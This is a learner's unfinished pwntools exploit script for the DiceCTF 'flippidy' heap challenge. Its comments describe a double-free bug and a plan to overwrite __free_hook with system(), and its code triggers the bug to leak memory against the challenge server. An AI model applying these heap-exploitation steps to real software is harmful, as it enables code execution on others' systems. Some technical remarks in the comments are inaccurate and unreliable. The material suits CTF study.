#!/usr/bin/env python3

from pwn import *

exe = ELF("flippidy")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

################################## Write-Up ####################################
# Challenge: flippidy
# Category: pwn
# Author: joshdabosh
# Points: 149 (currently trying to solve)
# Description: See if you can flip this program into a flag :D -> nc dicec.tf 31904
#
# This is my first time trying to solve a heap chall, and I am currently
# taking down notes of other write-ups while observing what they see as I work
# through it. Looking into Ghidra, the main funtion is not labeled but is found
# at a combination of locations. The program first asks for the number of
# "pages," which are the number of chunks you want to make in the heap. It will
# then construct the "notebook"/heap. There are 3 options you can use to edit
# it: add to a page (edit its contents), flip the "notebook" (switching the
# order of the contents of the "pages" in the "notebook" in reverse), and exit
# the program. Looking into the code for the flip function, there is a double
# free vuln hidden here: when the contents are being reversed, their
# corresponding chunks are freed, and then they are malloc()'d back on with the
# new contents. If you make an ODD number of pages, a double free can occur.
# According to the write-ups, our goal is to obtain a shell by overwriting
# mem addrs, including a GOT entry. The way we do that is using the double
# free and writing in content into the chunks (particularly pointers) to
# make the program think it's editing data in the chunks, when in reality
# it's editing data and instructions within the program itself. After doing,
# we could get some memory leaks on the heap and stack addresses, and like
# ret2libc, using the stack address we can find the randomized address of
# system() and write "/bin/sh" into a chunk to pop a shell. We will need
# to overwite the GOT entry of "__free_hook." It's a function to allow for
# easy debugging, so it will really do nothing in changing up the program if
# it is overwritten.
###############################################################################

# Addrs and pointers
menu = p64(0x404020) # pointer to pointer of "----Menu----" string
puts_got = p64(0x403f98)
page_one = p64(0x404158) # pointer to 1st chunk, for leak of heap
op_one = p64(0x404072) # pointer to string "1. Add ..."
op_two = p64(0x4040a4) # pointer to string "2. Flip ..."
op_three = p64(0x4040d6) # pointer to "3. Exit"
# Note: string pointers were used as filler to overwrite double freed chunk

# Functions for easier coding:
def add(index, data):
	r.recvuntil(": ")
	r.sendline('1')
	r.recvuntil("Index: ")
	r.sendline(str(index))
	r.recvuntil("Content: ")
	r.sendline(data)

def flip():
	r.recvuntil(": ")
	r.sendline('2')


def conn():
	if False:
		return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
	else:
		return remote("dicec.tf", 31904)


r = conn()
r.recvuntil("be: ")
r.sendline('1') # odd number of pages for double free to occur
add(0, menu)
gdb.attach(r, 'heap bins')
flip() # memory at menu is now writeable bc it was in the tcache bin and malloc()'d
#gdb.attach(r, 'heap bins')
add(0, puts_got + op_one + op_two + op_three + page_one) # when menu shown it will instead leak a stack and heap addr; doesn't work locally for some reason but does remotely
r.recv(1)
r.interactive()

# This script was incomplete since it could not be used to get the flag. The remote server went down :(
